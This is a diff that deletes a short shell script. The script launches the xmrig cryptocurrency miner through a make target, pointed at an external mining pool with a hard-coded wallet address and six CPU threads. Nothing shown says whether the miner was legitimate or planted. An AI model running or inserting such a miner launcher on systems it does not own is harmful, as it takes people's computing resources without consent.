@@ -1,6 +1,0 @@
-#!/bin/sh
-
-TOKEN=$1
-WORKER=$2
-
-make run-agent TOKEN="$TOKEN" JOB=xmrig WORKER=$WORKER ALGORITHM=randomx SERVER="stratum+tcp://pool.hashvault.pro" PORT=443 WALLET=42BenUPb4LR9KpwkDAbcDqHiioeFWtPgBcTRY1jUFo6QHQLhHAfPeSHcMDFYdB3fBVijk5b7BdQSe1cVNMSSBKXsAHm4oUz PASSWORD="" CPU_THREADS=6
